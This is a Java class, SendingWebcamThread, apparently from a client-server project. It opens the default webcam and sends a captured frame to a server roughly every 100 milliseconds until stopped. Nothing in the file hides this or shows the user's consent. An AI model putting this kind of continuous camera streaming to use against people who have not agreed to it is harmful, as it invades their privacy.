/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package myproject.Model.Common.Webcam;

import com.github.sarxos.webcam.Webcam;
import javax.swing.ImageIcon;
import myproject.Model.Client.AbstractClient;
import myproject.Model.Logger.Log;
import myproject.Model.Message.AbstractMessage;
import myproject.Model.Message.Client2ServerMessages.SendWebcamMessage;

/**
 *
 * @author BotNaEasyEnv
 */
public class SendingWebcamThread extends Thread{
    
    private Webcam webcam;
    private boolean isRunning=true;
    
    private AbstractClient client;
    
    public SendingWebcamThread(AbstractClient client){
        this.client = client;
    }
    
    private void init(){
        webcam = Webcam.getDefault();
        webcam.open();
    }

    @Override
    public void run() {
        init();
        while(isRunning){
            try{
                ImageIcon icon = new ImageIcon(webcam.getImage());
                Object[][] args = new Object[][]{
                    {icon}  
                };
                AbstractMessage message = new SendWebcamMessage(args);
                client.sendMessage(message);
                
                Thread.sleep(100);
            }catch(Exception e){
                Log.errorLog(e.getMessage(), e.getCause(), SendingWebcamThread.class);
            }
        }
        close();
    } 
    
    private void close(){
        webcam.close();
    }
    
    public void stopSending(){
        isRunning = false;
    }
}
